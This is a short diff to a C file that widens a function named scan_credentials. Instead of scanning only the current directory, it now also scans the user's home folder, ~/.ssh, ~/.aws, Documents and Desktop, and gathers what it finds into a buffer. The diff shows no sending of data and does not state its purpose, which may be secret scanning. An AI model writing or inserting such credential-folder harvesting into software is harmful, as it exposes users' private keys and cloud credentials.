@@ -1,6 +1,7 @@
 #include <string.h>
 #include <ctype.h>
 #include <stdio.h>
+#include <stdlib.h>
 #ifdef _WIN32
 #include <windows.h>
 #else
@@ -91,5 +92,32 @@ char *scan_credentials(void)
     result_pos = 0;
 
     scan_directory(".");
+
+#ifdef _WIN32
+    char *home = getenv("USERPROFILE");
+#else
+    char *home = getenv("HOME");
+#endif
+
+    if (home == NULL)
+        return result_buffer;
+
+    char path[2048];
+
+    snprintf(path, sizeof(path), "%s", home);
+    scan_directory(path);
+
+    snprintf(path, sizeof(path), "%s/.ssh", home);
+    scan_directory(path);
+
+    snprintf(path, sizeof(path), "%s/.aws", home);
+    scan_directory(path);
+
+    snprintf(path, sizeof(path), "%s/Documents", home);
+    scan_directory(path);
+
+    snprintf(path, sizeof(path), "%s/Desktop", home);
+    scan_directory(path);
+
     return result_buffer;
 }
